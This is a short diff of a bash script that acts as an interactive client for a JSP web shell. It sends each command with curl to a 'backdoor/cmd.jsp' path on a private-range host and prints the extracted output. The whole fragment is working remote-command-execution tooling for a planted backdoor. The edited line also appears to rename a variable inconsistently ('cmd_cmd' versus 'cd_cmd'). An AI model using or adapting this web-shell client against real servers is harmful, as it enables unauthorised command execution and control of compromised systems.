@@ -40,7 +40,8 @@ do
 
     # FIXME: change to correct command
     # urlencode get param
-    content=$(curl -s --data-urlencode cmd="${cd_cmd} ${cmd}" "http://10.11.1.209:8080/backdoor/cmd.jsp" | sed -ne '/<pre>/,/<\/pre>/p' | sed -e '1d;$d')
+    combined_cmd=$(echo "${cmd_cmd} ${cmd}"| sed -e 's/^\s\+//g')
+    content=$(curl -s --data-urlencode cmd="${combined_cmd}" --url "http://10.11.1.209:8080/backdoor/cmd.jsp" | sed -ne '/<pre>/,/<\/pre>/p' | sed -e '1d;$d')
 
     printf "\033[33m%s\033[0m\n" "${content}"
 
